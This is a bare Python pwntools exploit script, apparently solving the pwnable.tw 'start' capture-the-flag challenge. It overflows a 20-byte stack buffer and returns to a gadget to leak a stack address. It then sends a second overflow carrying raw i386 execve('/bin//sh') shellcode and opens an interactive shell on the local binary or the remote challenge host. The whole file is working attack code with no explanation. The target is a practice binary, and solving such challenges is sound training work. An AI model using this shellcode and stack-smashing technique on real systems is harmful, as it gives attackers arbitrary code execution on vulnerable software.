from pwn import*
import argparse

context(arch='i386',os='linux')
context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument('-r','--remote',action = 'store_true',help='remote')

args = parser.parse_args()

host = 'chall.pwnable.tw'
port = 10000

if args.remote:
    r = remote(host,port)
else:
    r = process('./start')

mov_esp_ecx = 0x8048087

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'

payload = 'A'*20
payload += p32(mov_esp_ecx)

r.sendafter('CTF:',payload)
stack = u32(r.recv(4))

log.info('stack = '+hex(stack))
pause()

payload = 'A'*20
payload += p32(stack+20)
payload += shellcode

r.send(payload)
r.interactive()
